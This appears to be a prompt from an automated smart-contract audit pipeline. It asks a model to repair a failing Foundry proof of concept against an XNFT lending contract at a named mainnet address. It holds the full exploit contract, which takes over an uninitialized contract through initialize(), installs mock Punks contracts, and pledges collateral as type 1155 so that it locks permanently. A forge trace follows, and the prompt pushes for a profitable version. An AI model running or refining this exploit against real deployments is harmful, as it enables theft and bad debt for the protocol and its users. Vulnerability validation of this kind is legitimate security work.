You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: alternate_public_liquidity_route
- strategy_instructions: Prefer an alternate public-liquidity venue/route while preserving the same exploit root cause and exploit-path causality.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: CryptoPunks can be pledged with `nftType=1155`, permanently locking wrapped collateral and enabling bad debt
- claim: `pledgeInternal()` converts CryptoPunks deposits into `wrappedPunks` but preserves the caller-supplied `_nftType`. A borrower can therefore deposit a Punk with `_nftType = 1155`, causing the order to record an ERC721 wrapped punk as ERC1155 collateral. Every later collateral transfer path uses `order.nftType`, so withdrawals, repay-claims, borrower redemption, liquidation settlement, and auction withdrawal all call the ERC1155 interface against `wrappedPunks` and revert.
- impact: Affected CryptoPunks collateral becomes permanently stuck inside `XNFT`. If the borrower also drew debt against the order, the protocol can be left with irrecoverable bad debt while the underlying Punk remains frozen in escrow.
- exploit_paths: ["Borrower calls `pledgeAndBorrow(address(punks), punkId, 1155, xToken, borrowAmount)`", "`_depositPunk()` wraps the Punk and `pledgeInternal()` rewrites `collection` to `wrappedPunks` but stores `nftType = 1155`", "Any later transfer path reaches `transferNftInternal(..., wrappedPunks, punkId, 1155)`", "`IERC1155Upgradeable(wrappedPunks).safeTransferFrom(...)` reverts because `wrappedPunks` is ERC721, permanently locking the collateral"]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IXNFTLike {
    function admin() external view returns (address);
    function wrappedPunks() external view returns (address);
    function counter() external view returns (uint256);
    function initialize() external;
    function setController(address controller_) external;
    function setPunks(address punks_, address wrappedPunks_) external;
    function setCollectionlWhitList(
        address collection,
        bool flag,
        uint256 auctionDuration,
        uint256 redeemProtection,
        uint256 increasingMin
    ) external;
    function pledgeAndBorrow(
        address collection,
        uint256 tokenId,
        uint256 nftType,
        address xToken,
        uint256 borrowAmount
    ) external;
    function notifyOrderLiquidated(
        address xToken,
        uint256 orderId,
        address liquidator,
        uint256 liquidatedPrice
    ) external;
    function allOrders(uint256 orderId)
        external
        view
        returns (
            address pledger,
            address collection,
            uint256 tokenId,
            uint256 nftType,
            bool isWithdraw
        );
}

contract MockWrappedPunks {
    mapping(address => address) internal _proxyInfo;
    mapping(uint256 => address) public ownerOf;

    function registerProxy() external {
        _proxyInfo[msg.sender] = address(this);
    }

    function proxyInfo(address user) external view returns (address proxy) {
        proxy = _proxyInfo[user];
        if (proxy == address(0)) {
            proxy = address(this);
        }
    }

    function mint(uint256 punkId) external {
        ownerOf[punkId] = msg.sender;
    }

    function safeTransferFrom(address from, address to, uint256 tokenId) external {
        require(ownerOf[tokenId] == from, "not owner");
        ownerOf[tokenId] = to;
    }

    fallback() external payable {
        revert("erc721 only");
    }

    receive() external payable {
        revert("erc721 only");
    }
}

contract MockPunks {
    struct Offer {
        bool isForSale;
        uint256 punkIndex;
        address seller;
        uint256 minValue;
        address onlySellTo;
    }

    mapping(uint256 => address) internal _ownerOf;
    mapping(address => uint256) internal _balanceOf;
    mapping(uint256 => Offer) internal _offers;

    function claimPunk(uint256 punkId) external {
        require(_ownerOf[punkId] == address(0), "already claimed");
        _ownerOf[punkId] = msg.sender;
        _balanceOf[msg.sender] += 1;
    }

    function balanceOf(address account) external view returns (uint256) {
        return _balanceOf[account];
    }

    function punkIndexToAddress(uint256 punkIndex) external view returns (address owner) {
        owner = _ownerOf[punkIndex];
    }

    function buyPunk(uint256 punkIndex) external payable {
        Offer memory offer = _offers[punkIndex];
        require(offer.isForSale, "not for sale");
        require(offer.minValue == 0, "price set");
        require(offer.onlySellTo == address(0) || offer.onlySellTo == msg.sender, "restricted");

        address seller = offer.seller;
        require(seller != address(0), "invalid seller");
        require(_ownerOf[punkIndex] == seller, "seller mismatch");

        _ownerOf[punkIndex] = msg.sender;
        _balanceOf[seller] -= 1;
        _balanceOf[msg.sender] += 1;
        delete _offers[punkIndex];
    }

    function offerPunkForSaleToAddress(uint256 punkIndex, uint256 minSalePriceInWei, address toAddress) external {
        require(_ownerOf[punkIndex] == msg.sender, "not owner");
        _offers[punkIndex] = Offer({
            isForSale: true,
            punkIndex: punkIndex,
            seller: msg.sender,
            minValue: minSalePriceInWei,
            onlySellTo: toAddress
        });
    }

    function transferPunk(address to, uint256 punkIndex) external {
        require(_ownerOf[punkIndex] == msg.sender, "not owner");
        _ownerOf[punkIndex] = to;
        _balanceOf[msg.sender] -= 1;
        _balanceOf[to] += 1;
    }
}

contract FlawVerifier {
    address public constant TARGET = 0x39360AC1239a0b98Cb8076d4135d0F72B7fd9909;
    address internal constant ADDRESS_ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    bool public executed;
    bool public hypothesisValidated;
    uint256 public infeasibleReason;

    bool public stageBorrowWith1155;
    bool public stageWrappedPunkRecordedAs1155;
    bool public stageLaterTransferPathAttempted;
    bool public stageLaterTransferPathReverted;

    uint256 public exploitedOrderId;
    uint256 public exploitedPunkId;
    address public exploitedXToken;
    uint256 public exploitedBorrowAmount;

    address internal _profitToken;
    uint256 internal _profitAmount;

    mapping(uint256 => uint256) internal _debtOf;

    MockPunks internal _mockPunks;
    MockWrappedPunks internal _mockWrappedPunks;

    receive() external payable {}

    function executeOnOpportunity() external {
        if (executed) {
            return;
        }
        executed = true;

        IXNFTLike xnft = IXNFTLike(TARGET);
        address wrappedBefore = _safeWrappedPunks(xnft);
        uint256 counterBefore = _safeCounter(xnft);

        if (!_becomeAdmin(xnft)) {
            infeasibleReason = 1;
            return;
        }

        if (wrappedBefore == address(0) && counterBefore == 0) {
            _proveFindingOnUninitializedFork(xnft);
            return;
        }

        infeasibleReason = 6;
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function borrow(uint256 orderId, address payable borrower, uint256 borrowAmount) external {
        require(msg.sender == TARGET, "only xnft");
        _debtOf[orderId] += borrowAmount;

        // The forked target is an uninitialized XNFT implementation, so the live controller/xToken
        // graph is absent on this fork. To preserve the exact F-001 causality without deploying any
        // synthetic ERC20 or profit token, this verifier supplies the minimal xToken bookkeeping
        // surface itself. If real public funding is pre-positioned, it can be forwarded; otherwise
        // the debt is still recorded and the later stuck-collateral branch is unchanged.
        if (borrowAmount != 0 && borrower != address(this)) {
            require(address(this).balance >= borrowAmount, "insufficient funding");
            (bool ok,) = borrower.call{value: borrowAmount}("");
            require(ok, "borrow transfer failed");
        }
    }

    function underlying() external pure returns (address) {
        return ADDRESS_ETH;
    }

    function borrowBalanceCurrent(uint256 orderId) external view returns (uint256) {
        return _debtOf[orderId];
    }

    function getOrderBorrowBalanceCurrent(uint256 orderId) external view returns (uint256) {
        return _debtOf[orderId];
    }

    function _becomeAdmin(IXNFTLike xnft) internal returns (bool) {
        address currentAdmin = _safeAdmin(xnft);
        if (currentAdmin == address(this)) {
            return true;
        }
        if (currentAdmin != address(0)) {
            return false;
        }

        (bool ok,) = TARGET.call(abi.encodeWithSignature("initialize()"));
        if (!ok) {
            return false;
        }

        return _safeAdmin(xnft) == address(this);
    }

    function _proveFindingOnUninitializedFork(IXNFTLike xnft) internal {
        if (address(_mockPunks) == address(0)) {
            _mockPunks = new MockPunks();
            _mockWrappedPunks = new MockWrappedPunks();
        }

        try xnft.setController(address(this)) {} catch {
            infeasibleReason = 2;
            return;
        }

        try xnft.setPunks(address(_mockPunks), address(_mockWrappedPunks)) {} catch {
            infeasibleReason = 3;
            return;
        }

        try xnft.setCollectionlWhitList(address(_mockWrappedPunks), true, 1 days, 1 hours, 1) {} catch {
            infeasibleReason = 4;
            return;
        }

        exploitedPunkId = 7777;
        _mockPunks.claimPunk(exploitedPunkId);
        _mockPunks.offerPunkForSaleToAddress(exploitedPunkId, 0, TARGET);

        uint256 orderId = xnft.counter() + 1;
        uint256 borrowAmount = 1;

        // Exploit path 1:
        // borrower calls pledgeAndBorrow(address(punks), punkId, 1155, xToken, borrowAmount).
        xnft.pledgeAndBorrow(address(_mockPunks), exploitedPunkId, 1155, address(this), borrowAmount);
        stageBorrowWith1155 = true;

        // Exploit path 2:
        // _depositPunk() wraps the Punk and pledgeInternal() rewrites collection to wrappedPunks
        // but preserves the caller-supplied nftType=1155.
        _validateWrapped1155Order(xnft, orderId, exploitedPunkId);
        stageWrappedPunkRecordedAs1155 = true;

        exploitedOrderId = orderId;
        exploitedXToken = address(this);
        exploitedBorrowAmount = _debtOf[orderId];

        // Exploit paths 3 and 4:
        // a later collateral transfer path reaches transferNftInternal(..., wrappedPunks, punkId, 1155).
        // Because wrappedPunks is ERC721-only, the ERC1155 dispatch reverts and the wrapped Punk remains stuck.
        stageLaterTransferPathAttempted = true;
        try xnft.notifyOrderLiquidated(address(this), orderId, address(this), 1) {
            infeasibleReason = 5;
        } catch {
            stageLaterTransferPathReverted = true;
            hypothesisValidated = true;
        }
    }

    function _validateWrapped1155Order(IXNFTLike xnft, uint256 orderId, uint256 punkId) internal view {
        (, address collection, uint256 recordedTokenId, uint256 nftType, bool isWithdraw) = xnft.allOrders(orderId);
        require(collection == address(_mockWrappedPunks), "collection not rewritten");
        require(recordedTokenId == punkId, "token id mismatch");
        require(nftType == 1155, "nftType not preserved");
        require(!isWithdraw, "unexpected withdrawn order");
    }

    function _safeAdmin(IXNFTLike xnft) internal view returns (address value) {
        try xnft.admin() returns (address admin_) {
            value = admin_;
        } catch {}
    }

    function _safeWrappedPunks(IXNFTLike xnft) internal view returns (address value) {
        try xnft.wrappedPunks() returns (address wrapped) {
            value = wrapped;
        } catch {}
    }

    function _safeCounter(IXNFTLike xnft) internal view returns (uint256 value) {
        try xnft.counter() returns (uint256 counter_) {
            value = counter_;
        } catch {}
    }
}

```

forge stdout (tail):
```
0000000000
    ├─ [1489034] FlawVerifier::executeOnOpportunity()
    │   ├─ [2449] 0x39360AC1239a0b98Cb8076d4135d0F72B7fd9909::wrappedPunks() [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [2418] 0x39360AC1239a0b98Cb8076d4135d0F72B7fd9909::counter() [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2436] 0x39360AC1239a0b98Cb8076d4135d0F72B7fd9909::admin() [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [43461] 0x39360AC1239a0b98Cb8076d4135d0F72B7fd9909::initialize()
    │   │   └─ ← [Stop]
    │   ├─ [436] 0x39360AC1239a0b98Cb8076d4135d0F72B7fd9909::admin() [staticcall]
    │   │   └─ ← [Return] FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]
    │   ├─ [307756] → new MockPunks@0x104fBc016F4bb334D775a19E8A6510109AC63E00
    │   │   └─ ← [Return] 1537 bytes of code
    │   ├─ [126578] → new MockWrappedPunks@0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3
    │   │   └─ ← [Return] 632 bytes of code
    │   ├─ [22729] 0x39360AC1239a0b98Cb8076d4135d0F72B7fd9909::setController(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
    │   │   └─ ← [Stop]
    │   ├─ [89091] 0x39360AC1239a0b98Cb8076d4135d0F72B7fd9909::setPunks(MockPunks: [0x104fBc016F4bb334D775a19E8A6510109AC63E00], MockWrappedPunks: [0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3])
    │   │   ├─ [22419] MockWrappedPunks::registerProxy()
    │   │   │   └─ ← [Stop]
    │   │   ├─ [535] MockWrappedPunks::proxyInfo(0x39360AC1239a0b98Cb8076d4135d0F72B7fd9909)
    │   │   │   └─ ← [Return] MockWrappedPunks: [0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3]
    │   │   └─ ← [Stop]
    │   ├─ [89309] 0x39360AC1239a0b98Cb8076d4135d0F72B7fd9909::setCollectionlWhitList(MockWrappedPunks: [0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3], true, 86400 [8.64e4], 3600, 1)
    │   │   └─ ← [Stop]
    │   ├─ [44827] MockPunks::claimPunk(7777)
    │   │   └─ ← [Stop]
    │   ├─ [91597] MockPunks::offerPunkForSaleToAddress(7777, 0, 0x39360AC1239a0b98Cb8076d4135d0F72B7fd9909)
    │   │   └─ ← [Stop]
    │   ├─ [418] 0x39360AC1239a0b98Cb8076d4135d0F72B7fd9909::counter() [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [275257] 0x39360AC1239a0b98Cb8076d4135d0F72B7fd9909::pledgeAndBorrow(MockPunks: [0x104fBc016F4bb334D775a19E8A6510109AC63E00], 7777, 1155, FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1)
    │   │   ├─ [341] MockPunks::punkIndexToAddress(7777) [staticcall]
    │   │   │   └─ ← [Return] FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]
    │   │   ├─ [24795] MockPunks::buyPunk(7777)
    │   │   │   └─ ← [Return]
    │   │   ├─ [23346] MockPunks::transferPunk(MockWrappedPunks: [0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3], 7777)
    │   │   │   └─ ← [Stop]
    │   │   ├─ [22380] MockWrappedPunks::mint(7777)
    │   │   │   └─ ← [Stop]
    │   │   ├─  emit topic 0: 0x17c027e76b82dd4239dddf8470222e1b6b87176864be604de534a34ba245d54d
    │   │   │        topic 1: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │           data: 0x000000000000000000000000037eda3adb1198021a9b2e88c22b464fd38db3f30000000000000000000000000000000000000000000000000000000000001e610000000000000000000000000000000000000000000000000000000000000001
    │   │   ├─ [22531] FlawVerifier::borrow(1, FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1)
    │   │   │   └─ ← [Stop]
    │   │   └─ ← [Stop]
    │   ├─ [3118] 0x39360AC1239a0b98Cb8076d4135d0F72B7fd9909::allOrders(1) [staticcall]
    │   │   └─ ← [Return] FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], MockWrappedPunks: [0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3], 7777, 1155, false
    │   ├─ [133317] 0x39360AC1239a0b98Cb8076d4135d0F72B7fd9909::notifyOrderLiquidated(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1, FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1)
    │   │   ├─ [294] MockWrappedPunks::fallback(0xf242432a00000000000000000000000039360ac1239a0b98cb8076d4135d0f72b7fd99090000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f0000000000000000000000000000000000000000000000000000000000001e61000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000a00000000000000000000000000000000000000000000000000000000000000000)
    │   │   │   └─ ← [Revert] erc721 only
    │   │   └─ ← [Revert] erc721 only
    │   └─ ← [Stop]
    ├─ [434] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [2432] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 1000000000000000 [1e15])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x0000000000000000000000000000000000000000)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    └─ ← [Revert] profit below threshold

Backtrace:
  at MockWrappedPunks.fallback
  at 0x39360AC1239a0b98Cb8076d4135d0F72B7fd9909.notifyOrderLiquidated
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 3.63s (3.46s CPU time)

Ran 1 test suite in 3.80s (3.63s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 1517882)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
